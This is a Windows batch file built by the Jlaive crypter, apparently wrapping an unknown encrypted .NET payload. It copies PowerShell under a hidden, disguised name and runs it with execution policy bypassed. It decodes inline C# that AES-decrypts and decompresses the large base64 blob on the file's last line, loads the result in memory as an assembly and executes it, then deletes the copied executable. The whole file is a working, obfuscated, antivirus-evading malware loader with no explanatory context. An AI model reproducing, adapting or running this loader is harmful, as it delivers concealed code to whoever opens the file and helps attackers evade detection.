@echo off
echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "%~dp0%~nx0.exe" /y
attrib +s +h "%~dp0%~nx0.exe"
cls
cd %~dp0
rem https://github.com/ch2sh/Jlaive
%~nx0.exe -noprofile  -executionpolicy bypass -command $fwuINS = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);$uswdOf = $fwuINS[$fwuINS.Length - 1];$ttqyvt = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dXNpbmcgU3lzdGVtLlRleHQ7dXNpbmcgU3lzdGVtLklPO3VzaW5nIFN5c3RlbS5JTy5Db21wcmVzc2lvbjt1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5OyBwdWJsaWMgY2xhc3MgQVZsR1F5IHsgcHVibGljIHN0YXRpYyBieXRlW10gdmx4eUxZKGJ5dGVbXSBpbnB1dCwgYnl0ZVtdIGtleSwgYnl0ZVtdIGl2KSB7IEFlc01hbmFnZWQgYWVzID0gbmV3IEFlc01hbmFnZWQoKTsgYWVzLk1vZGUgPSBDaXBoZXJNb2RlLkNCQzsgYWVzLlBhZGRpbmcgPSBQYWRkaW5nTW9kZS5QS0NTNzsgSUNyeXB0b1RyYW5zZm9ybSBkZWNyeXB0b3IgPSBhZXMuQ3JlYXRlRGVjcnlwdG9yKGtleSwgaXYpOyBieXRlW10gZGVjcnlwdGVkID0gZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soaW5wdXQsIDAsIGlucHV0Lkxlbmd0aCk7IGRlY3J5cHRvci5EaXNwb3NlKCk7IGFlcy5EaXNwb3NlKCk7IHJldHVybiBkZWNyeXB0ZWQ7IH0gcHVibGljIHN0YXRpYyBieXRlW10gSVpHekdwKGJ5dGVbXSBieXRlcykgeyBNZW1vcnlTdHJlYW0gbXNpID0gbmV3IE1lbW9yeVN0cmVhbShieXRlcyk7IE1lbW9yeVN0cmVhbSBtc28gPSBuZXcgTWVtb3J5U3RyZWFtKCk7IHZhciBncyA9IG5ldyBHWmlwU3RyZWFtKG1zaSwgQ29tcHJlc3Npb25Nb2RlLkRlY29tcHJlc3MpOyBncy5Db3B5VG8obXNvKTsgZ3MuRGlzcG9zZSgpOyBtc2kuRGlzcG9zZSgpOyBtc28uRGlzcG9zZSgpOyByZXR1cm4gbXNvLlRvQXJyYXkoKTsgfSB9'));Add-Type -TypeDefinition $ttqyvt;[System.Reflection.Assembly]::Load([AVlGQy]::IZGzGp([AVlGQy]::vlxyLY([System.Convert]::FromBase64String($uswdOf), [System.Convert]::FromBase64String('wzsx9LWUv0rydrGgW6A7fhYmwua4K8avuhQKe5WYc/Q='), [System.Convert]::FromBase64String('M2Pi7BCfT30Khghhj9pvcg==')))).EntryPoint.Invoke($null, (, [string[]] ('%*')))

attrib -s -h "%~dp0%~nx0.exe"
del "%~dp0%~nx0.exe"
exit /b
cd2LcbgQ/7mLZfCsp/oVO9ATUgF6ZogHvv3Vnsr8pJDqxvaQ9vlWCXJIdq4t03FFTtXXAGkBLnC/05WK6wFrAZCsA0yeDPJRwBF/83iQH6un6ITTUxdDyFxUCM4gnBStyQNQKkKKsZwDRu4dlvAFTLesnXCqKMvslRYAHv5ypmDETs80skIvHDRWvE/121yBcWcC6tZmAfdOZ9cNmK5x0A6dBNUWX1ZfVAJbGRlOye6VJSimPwl5BjTcu+M6tumwPxwWZuZlWkHhwF7hOWanNzutepnozaJqcDEXD8pKTj2WZbgk9SGCiEv2jOiA9+UYH4UfGGC4NWI9I7Q2sSvaF2laHkmwuf+jtnyCSSLhRk1wRkTwhfJ/I5WopM+846GyzvX59RgbXamzoohsSQAh4uJlcAlo806KffSa72kzbdS/twejJlekSu9VR9NC7VC072bFHkd0avlDACTsoTM10+0itwt4VvGDAu7ULikIsCmVhxgWulcFS/2B3O1SkbiGzDhslPgkCiFCoD3FbXQkipxNe+U05JWI79JzeMvvB8ZBoYshFQMNVA4PiEOwUW2dc/6JfrR1DR5uCqWfpdFE3Qr/Mx5k0PMzhf+b3t44JXCdDt/jDUtqDjZeX5rGBh38mOY3Gf6tjrXFuWvXh7gVPdhLB4/jJbLXIIVebasts410d5+cOI477UO7jCUSVvIGpNbMQc5LJ5b6A4HZJEZoo3+fnrhpkYlXoIrxaLN9PAFXj41lZS0EHKGDZwQzAji+IyhhGdEfSZ4cbxnJPuDJGjerTfAWaIa2IWGaIN+/MaPapC83mDtGjFDMTLq5ZYIYj2nfIJy6W8JNBAxJSj4zGulPEoAfsmDhFbi11Ly/2qHbb8kWAU3caneNXEKSi6Y/CKJMl1vReOPrpNZseva8B0u5rp1R1ZsOgpw8xJJ4mCqReOBZebElyUZ4wrQF1uAmqdJ/Hm+eWKZES0IONF+1Z4+256+aA24GEF182eCPThvV8M33oJv3c3o37nUysoBJRshDJRc2bCd5GeQrIPFIxDwaKEupwc5LYz768+4U8fCsmOJoi7bytzyv4C4xqOQFT4zaV+9Z1siUtjbFTQ90dCkW51/RLsVD5VLFeoU8w9SnsULklF/hVc9rQj1WeQUxBMwo29GNFLrJvRTXJJiCZmZXN1OGxpu6qfFvhxD/U4t9DL3hA7rWToIwRwBOUUnwCBrzuK2lorLbLZ4NfJ8rzHB5Fj4oRjBC4a7RcjEpMGwL/yua5Uylh+ZHiX0nArxdD4kT1fJ7Hjy7fJLzUfaOS2Z9I6J+vlVAnC0DK1Sad4pijaI9M8oNPZfylZV/hSkk2EbsZgSZoLIFZjwVcRqaLaaNXAlHlAQpYfsEFdgU782ofIvNemuBcxQvbKySD6fvwMSrkQqovGqSYCXtqVUvWeDBeAJun3B23c/ofVsPJlZvMsM1yRXlTj1aAIouBiPinLrcyzorroCn0AgOU1OJ/7q8gKNhaGfvqSpg7aZARhwrjoEmOyp31NbrDbrnDomyXhOTgzs3RQkQgqWPkgcZGz+/DxTH199QQywr5e8NHrNBOin2jRQRiCh0nt1Po+79p/8NoaefTuBYyySfXKeG1x75+FAg2ty5627e0BuIZVYHMNRS/8x60OKbZ8JePftNZL+SFSSOnaMcQrSZGsz+mvxkkqUiCDFtVB1TZwHLZZ6E39klqMleMTy+5WzQzvtKS63nDlDxm7Yil9GomzIZgMm2T+MvG2PNMVirp/kcSyIm9oTTEfEhjysOk0Z3vGdkiauzHJoXAbLLk4HvE9ucngTCSKoIuY7ZdgwadhaQhrovn1bkLcDqfg1OWPIwDMHzRDi8q4+rNPwH/aVh92ATpgAJA8K/LaPxZ5dOwcFy7rxpPsVRJvyNTJpx4V1kedKxlQ2/I4t7qJPo+18rL9DBCKfO3lGxGR6Zz5/7N58lJCYiUV365lVLskvh13jwLmPcDpi9eyZEz0VXVPP6LBe5+b1SiAt/w7rOrHIIWlQJgINBlF3EmZMuyZHqQPPrYoO92EwHH50xiQF0ota+xHjJzv68pEH+Kr0l0t9z8L5o39P2QjDfZ74erKAE4JZcNZPWADR/v6Lsmz2VncusnQLvJ25/kquy+32rf/3L6VrX38JZUUlJ3mlKvk6yOFH5Js4asatMoDwzRnV63fhxMgvujliIHnfNPIKq02eVX/P0057WT6PuQWeZEIAKOFPGxfFEYvOOP92OnbuSU8Mnc+KQD/OzG2oGCM7CscHE2X6heSX100K7nsfx2Kabu1N+EliSx55dpbRC0U1U86xhVi4hVZQpEDfZkgw4irViIonLPXE8sb3lMvQfqwjtJgnUOAyQQOYV7GM23SJGH0al7xmt58iJrxeIMoDqOZNbKIpaa+QijJwleOjKbozbL+hG6PvKgOWXYnc3r2mZv8NQuuL7G0EeQGOtogoSVmud/OB4JkOlf1hfmYzbdG6TxB5J8CiapVkrRobS8VMVS6TDK4IQuTD58cYfV3BDIsIxe825Mbr3EPpo3/0+oNULOD0elQM9+a9KP4eyJJnF/L4IWLmkhKaBE7DPN3XDx0k4Ik0Kv0kzwwaJih3oRsTwWmoOejIma9idP8VA6NXmxxHKDwMcIX6istFpfJw6UdDgsElZXkK0sIxVldcO+0tGwRGWKKqfCkqRod4LqQwypu+e5nKFSCpA1e+sSQsET6KfDRKiLYjqMlRL0vmWY6+8zbDG7+A/w5sIsOJjqoUsmicaJBdEpO49X1oz8yTxAcIKU+GKj7Uapn2ibJ0u3K7MYPOMYPKefNoJ339N5qPsVEI5UEYi6oY9/hK6Uv5GqC2PNFWOS3LB41bmJyVcaZj+VJpkasmLdeW8CzYc82id3Rf4dVRlL8WMxzO6PLmobghtQ3clWnSUnA9TS7JXvMjFzXIRk5GmIguy2vUr+2XOPSMil8v/REQXMDs9OgRt3ugveXEx3AePlJjo9ZM3QhPb9wKB2mTeUf7sDDCoaIDwvrYke114BWxjia8gm2+pzUWwWaqLYe80+DEixG9mfetPGoY56z9ueOqEFksZEZm/OqVhYeFTsEsC5nbNpW0a9VqtcqYzt4XXpcPG8hNxyJNxivxjJxgXaaTNI+oBtv9HdSilmq8WGpgzagaPdwEl3avu3WF0Le4ET4cm8UKBIHV2g/Qtg9bk/fSHLstAI4kyLrjd0QNCJm0RljY+GpCFh7N+bJp3R7WPHDiMk9GqvTC8dtQe15weyvIYKgJiQF2aChUUq2PhoBZxGZoM7JAgZdRlxpnjis6SacxzFFeUKORwwoBroEfFtF34A+pTgKH+ur1VhE+MP3ZSKo0Ef72uFyE3mHoj5amLJSsZRHEO9zYnhJjUTdj3Fl8jxHALrVnnapFqRnQZb9siqG9/oYE393jotmlgHhB5GUCQWsm7dbwofIbHg1cgZcjNwEadGjo/5KTGBObyFeOFPDXKKImx+2AfyixrYgofaXk5JzbGw5+deoi5GFgEsRjbrz2jOYXKQuVKRilfMRZW5MTb0VqXw5OfnZ1SnjGrAcJSrhnmgpHs0WgMYeYDtBeUhv3YdxI6WutBe6fXnqxst91tR822trGUgo/1H2dxx/GQeku9O51i+qI6lwqh0DtDVBGm6Gl0okP8MksOwwLJHGftl+7NoyLZSkPBKh5MiA7npuwBbx0Ia/qrsEh4EZOsXxTfMG2doC8c/5CaPiAfOUBKXTrHUQ2b4DxRc+prdaDGTxrBb6Rn6+ubqJT3abIkjOUFRlK1rDE251Zznm3nVGQGFcAtk+InFJZfS0RbbnIDlc2ecG2hvFll+Z6iYoQAuVH/KGKIdNp3L4evF2Hhg6ByJdWBD4xi0jM05gtM/xm+fkXamIJfwbw8t7XgZ9DHXl3AcFkeoFK82uNSlXs9C3AxK6i2MKKbApARpFjSpLicfT4SCnm+uFtp8xHeJQtwNZi83fS1vw9rExonOruL/ll0eb9pSglIDJICvK9KeRYpOciXGjxEn7VY70bxF7F1maH/XaKkVQF9c3rvw5ZS/wfZvm6yLoxKvvf4+ArjjCerdbu1r4rKTd3Tc47hZIXOb6wBoTlPo1gmyrXUGJrZXh4Xj9k9JR6UQ3HnuqKMm/bI7lZw385J6cNwJvrSjXPQYbFtjwLhQdakNyCexaAq/TFHAU12BmqlYMNQR80zB+mJci8Rt1ryqeZTCmScGotGZjp5SBCMw9UK/w7sMzSRJNmLgy64CTYHoHZJAvSRmbchFSiEjPFdeLG9qQcZB1iefmq/BPeWERsV1cH/NOV8J92piEZ5MximQWJ9ElPLJdminCi+FyPnt/Wijhhe3pvby/Tj9DsXgCQ6elKWK64VCyPzegA/rZ5b9viSkLDlC3IsqW1hAvDmuKl6cYCKeHaitF+3A32oIXS773TjHvGsZgE9FhNbwD0Lym4CL0eMWldPKJf9/LI3bOjTYcbsNF43pqwNNLCnIOORr4x7qN849ON2G1M/V2Kunp9Etkwivp7H11TPBthKMg0VjALY4EXpFtDIoNHMvj/RpVDhoIUUVaMvHB7GoNjJnO+5Ii/0hOS9/QAfrA5F1H6/fW0WpzR/I+UBe1+X7HRDDdvoGqoweoKjrN92jY94FHhkJk7H92hPQKFiuFLa/VsGSemSKO7XKXKX5VBL2LEv74ZHkB+s6JwA8jXKqa9n4ZW4+qwTP2FSLqkKj1vUEIdpSpPojaw8FF3xnLYWpITlXEzyhjZGreWDy2v4Xe+SH16EaeXF8t3ZljGxvLDnjjKRVCuJWtDWR5x3LpB6M34iyydmrcsUV4G9jhFssq1Ird+GbCnylizFyQMsH0h8AWuUj3U04Tv96VyFudRvfVsoAIL5EbX7HQKH7AZlt14w611kqVsaSWGK6O8PwW8GkSPkRkZ6rpkSOasEB8coKbihYBPVj+gouiw3AG5UtafJ/4Vx0K48NcpcExwGgauZIvSxOuw7aU1EU+dqhP4prapI8n6bICRBisTIpvQ6ErMoke6AlbRqk5mbt0tfE72e8iB0X/miU8RZKRvYchvxmHm0O1en5Y83KgJ4RMBuSgEvTgP/KbeO1Wkv0NSRP4VXYoTR6SCjQTDpyIUen8oFVMOLliANCuS9j5tZvDe7O5KlaSgoMm5zU7y9RQ6YrtQJgs74nW4k9qnQ390rNNqcGkiyeH88uFExmWiN2Ppx2s1w1sJ5Ai+8sOQiO1K6fMbMOUlmccZSTUB3rbzwdVRh49uQpJUW8qNHTCynSoRqZK2TjMocErAD8u+QiT5YTBQulA/Lz2npv2/4Bq4O9iUMiv/T1Sn1wf4qJPxRPqSXevjRtkYikOS094rxK3bw0K8DVOoxdZlYBOCVliMjMhJ6IQgqPQY4JX9zSadnm6FZEjAWAXjRn/j7ixMuyOjuf9GiH55WwdEZD0eF418+oYOLVvdWWXfBVGSgZv9AW8BMzeYw32U4zxezmQ0dfPv8zlErNQ0mXdc14nN0muB9ZkkXfsv3TxsEvmtn33Br/BW3GAaghCQZ0KPtYnD1dCi3nER7MmgFSb87e3khxL06Ybvzs7hFr6HP5RFWTPRp5V7V2LGmxdAX8Dk1zlWVpFUY179LCkvuZcRL+7Sm0ZUbDEWzhAQu65x+xNMY+yVkiYdV0eP23dPSt709DD9NNlOBGeaKBXFIu8WOuRoJNftzMxOGmgNMQCOiTv2AgsNlT4wpxr31oxXIfcyEl5ebqrG/rPuamNLv5P5htmKEIANOkNk0P1RwV9df0FM0n4/qZH5uelK0ii6Zq2jLf9bTiTytxFF2UpWQnezfne3Lhw+nOJbA6hx1OPU+u3CPsU2ZuV0ACXbqGBsVJdw5FC1RhkzXWP4s/hrVf/he8XcM8m2PWRkaios/CvkUSxW+C/GWwAdP65IakBZRWcjW7Zo9GSc/SUxkrlpvIeUPGRde7KDFWwhNI01OEYM4P3keFFInzSkGpR13jmZyZyxHQeq1k27KpWV/QCvTskJO/7lW6iELCJiqK/BUS47ilLfX0+ZjGMk4InutoIXJq2SFjNRwkUbvH24TxgfcxhozzjpTZGoFdra3s9Nc4S7e15waNPaHPLjBtB6DBSQ08+Qn++jTibYCCPm3esNUgf5JaOO1yM5c/wI04if2QL+cfYNtygI8D2rVZue3d1yO1XADcQ3DasJqgG1S1fW6MbOz7zj/tVWLqPu3qfi/95t8BKzW8xlxt4Pqv8rWNIx6QEY9pARx3iEP8AYUZID0zcJNa5LBE+4jlNBqHsH+gLvCNkiEfa3cmf1qlFkH5taOkqbNF0rzFRcdd0N7+Z/eXagHLDI5h2tcO7rl708094n8c1UEQggdnIGVxx0ZMftRd52vHt9KIT6srU+44kwAMPEQQjPwZdXYmWrcpa9hczpy/VrSDdBfke5LsEoEQnUVVcHOyCwHgkd6BP1goONF1S5+QlzStzt+uxdm2739wsimdC8kjrVmwq4KDw95E4plnv3G0oxVCkKFGHauMghxZ9JqhbbWf/SYgMInAHtx3iuvskVtoKg9Y8Qf2hi0KXUiwEpXBZzA/BbifolxXQh+40QuPPrwhMtRcxg8pC9YVcDMwlMQO7Kc/RhElT6cy+zCDK711+KuH0D5lHlU8DmBRVz52BaQ2nAHNHHvrSb5oQUBOztyXC8GQqDQMh7JVmF2Z9yV4QZGeARLqwQu1c5c6skXNoja1ezFG+fOJfR4zW42oByfSDvSi8jXj4tOM3YZligUNzy0syqK5DaZh3YeObE2D0QhSlwndvTYw6XvPSvZFKHldmB8Q+r33c0kZ9d0UrMM/LTSq6I7sOVjjp3boLGfcRJvZnEw2KzuUsse7JMmtIMDeUzdEWn9gJuBJFE6r2ppStF4/zlatL/yFly8SCdDlJOTZc7GEbdnGHOGulx95oAW0U56yckRrW9Wa2YRNe4K78HIl+GxFUG+bFK4rzO4cDmY1VfkbQRcwLvGpjF99g/IgjnNDPy11k4tXXlIfs79BFKsPP8f2+xVnWow4I9ZNiTinVZhw1XZWnxY66CYjvPmEC7kvKB/UW+r0RHK0TC14QCtt90lRcUeD/SsH9dfA9txNjbLc05RuXfM6eNMj7uZJaifnFBENiwk6xvjfM/WU1M8+tkS/iMfvI35cUgweUlG9BCf+JpSQuI8FdWEL8mJGMWh/adXTEyChaZ0fAGwWxCQmpFJCxu3hoVkd5WP+yMe2TOigBKoXxmH3sG5Hgw0jKl/+69IinWaXdO039/ZKSsWHvVcKVm0wGH5QbqP4srHyF3ETnOl8CvtiS4XLu5MnB88Bp2T8Ni7PF472BQgBNUzoAu8nyoLa8NqcGJlvxiMNjAhUTRPrQgHqDsruoqt+P8xuXMLH7xtH70pECnbR86Hdmlp9piwS1D8oyCSpOEJP5O0i2ra1gpdKdbrwbAk3jgbcImpsMPbZCyZf2cQr3pP+dr9Jt6Xsci9o9P02j6Lsdlu51+xqays+YdC/E+Yhsv3Q1Lg1wRSIB2JLT93X7IeZkFHSTXXCvQM8Bq829vwDB3GAdohIcYE3H8FyHWKjqkCgBVYDlWvPu1e4oU5XI7H6jS67ZOwgmoM1mHuFHw85TL+bfWnKVS71eUvhhfgzJBsWAC9C4VEpPq9UKZXpZRHNo/dvcevL57a8LOAnhnu8ix19sRD10fPz39JyRuIC2IsiE3RNRHWJRYfiDFqo3fEgoOM48txSuSpob5hA0fJ1mIkaDfGdO7ldFAfxLRgEsAt0HQHVDR57Ko4U2/Kqmo0L3JiFzWuMTYjYpEIyHYDI1yeo2aOEqVTsVhMk9WdrFcNXOObYQ64wwLGGlBKlVKohlSnMfK0GhdwJNnuuGzkUa9CxwwAgNV14R2YIWCvNHTBuifgD/EpyBbaahDl4JzL2RDGWWjKhV08P6OmA2wveWvG+rQH8IXw2IAi0jxxrp/Nj5lK3XtGSI/nNIUc1Xc7Xs9+pM0nHuzkFsyBXZL6BBLg0lnlUdiYYLf75AzGJlS7J2yznpoBftMDiWkUszRQ2zWO5IAo53pLCfezLxyLvc3I3wnP7Gt3oSuCkrqzF+0TIEfHYzPne663J7CDEev4lq9MJ/4H5uELzdRqDSWHhYpwLQxk1heBThv3WXMG+9EQQXIj0vhuGHvWlAjmjlmeIyFRQfuQABTPO8efUjPCcNSy/E5pyBeiHYKPHKthc+09446uX1CC0woq6LfgkMIR1WiTjMbAfCzDoo+9mcSuChOaGxdjfO8a97DuPj1mRa2ODPWQDTAewPCLoL+pUCTGnRsFtDlWnujJQ6jJmDiefaOmvL31sBJTAcGi5Yl+LvGSAbyQZMqKw3RlWMtXyc5JLJ9O/RdzoVP0zfa9HAhBq8CS7+9QORvNDPyQk002sTZ0DZicU3HOOWXOLnT03fieU5E474ZPlllbl/X7Oo+7cTkiC/UkDMTLWfggykHdI2OC3i1m3/FjsVD3Bi09pEv9KCcIKA/Cm2ePhjwcnvpG07TTzg0wLhMqopADJj7jVPsdCS1QvC3a6rFz/AH8dOh9kt1Kgz9iFie1Sa5P2CHWobmX+eHRTv6+etJmF+njRxFpmNXsz8txkbiUjgvwGexGUCddo4pFfh8Msrt+J0uLiV1dPDrg9mYZuYBINtjw7ASs8aZ4LAogxpMnUKqkJBiWTj4mu5pBcc5B4sfeukKgpBa6izQcsOWHZZGgh5tgns/ccpZFZkaPpwyjOboLIW9w/1gt2CNiHycv1uBDNa6AXP8Q8BvlzqAsCAp0iNq8ptSn35OjDDhzIK8mTgX1EPU2nqxoLoDaoPIGl91IuE+b+fIImSjQmlqk2mPAT7L/cQyuH9ZcOsFeuyNnMdPCghDEtOaSHPamCZfD8W6vKoxEMXrPBJIyQJjw4U04dYhsyGjzm3q2/VyI8xb8VOJBhoCN8di2/zUUl3JAClGrJtA/Ol0x4MkrEQmMv98nms496nqBTc4O8BiMHkkaYr61ivbo8B3n+YIDGcOn5vDS52r1PzPE9jiK9ghbUgoT4QuB17ZyS+Lu474xuK592bd7y4kh5q1/pKy4dztP8jaxvzenXa0XGKQQnye7IR1Mb9yGEL55ZRXrE2964oBlaAUjBeMPCAOXp58xqIrUMYbJEJcT3JaDOe94WtsbsSSAOZDQsr7cmas52U4ONngt3zbYI+/VfI98fszmuiKsw4Aqihbg3D1SRrx/1v7VtDHhfejUiSH2Jrvc+ZvROpCuvQ08+Nx3FWhOSTLZr4kmjUEpKyJ+JFnwHN+PWcBlfA2zC/HE3RcdTQA8Beh6Bn+CsCBo6uzgKzQ3qubSIT9sPKLXScDV/P+oPzdu2kVWy80TWrbLpLYQHFfNMXcM6eb676lNXBGZZeuuhyqWnh1Y2WgJ8NSe3JYngnP1I+SR7JjT5uRh9q5Qg1RpopI1QTI53rr7COkrgOT2ZKnP2UDCSNiBAGXeNz6vQlfWC9Zu8XMkownY/d+nyLxqehOZ6GrSN1vYth5enHymYLEfrl3bpqv4v1VmponqvnDyzbhUDzgOI3Sb75S6qeANjoIlkYUpiCXCbeTvKev8Ium9iv3K+sNT8w+YSpd0i3NYmdQx1CifFf9D5NKrBUfrsADMEkMXS4MPNTSWfzdsuV8/e+rxEBN15EWcS6ijW4i6pmiyBeB2aYSzYwnlwfjLTpiSf+k6wVf9r+rpIM9M/1+Zf2uJGiZ5W49D5ovtti3ltRNBnexeWwQQwZ7Gkv45MieBYlVmMSnX3iolJEdWUbaPZhFVSqZyBuu+UYm2cuxl4KNRTPQznh23Xhh6UDvB1BHwmAELeFFWl1vROHggLgei0FrfHeZBsxUtKmh3klS9UV+vonzw+v+l7hi/emXyc7yKPjYDDTB34RrUjfmD/yrcyVmO0ss+0zPNkCoIwDcya84MBeKAJaYOi8tJzdqbW8l1ej0+k3xyGzfwtbfoYQFOBdAZNRDopH1tN75aZVtWZEAJZzxgRFJi7i87WpkRDAdlvesOTjsh/VoI2wD7W+tb0GSTl/bpfIueqNNUJm09h0ON1LnRPzXAyehlNuWG6YETcn+OX5cO33kvGZ85daYakjmK40x7PeKxokNx/gRywX2vMCVu5ZpJ9m+nxcGxIThpyNnbZRmP5LYcayW7AnsSwihaud421CPT7LaIJptkjARATX7Obg==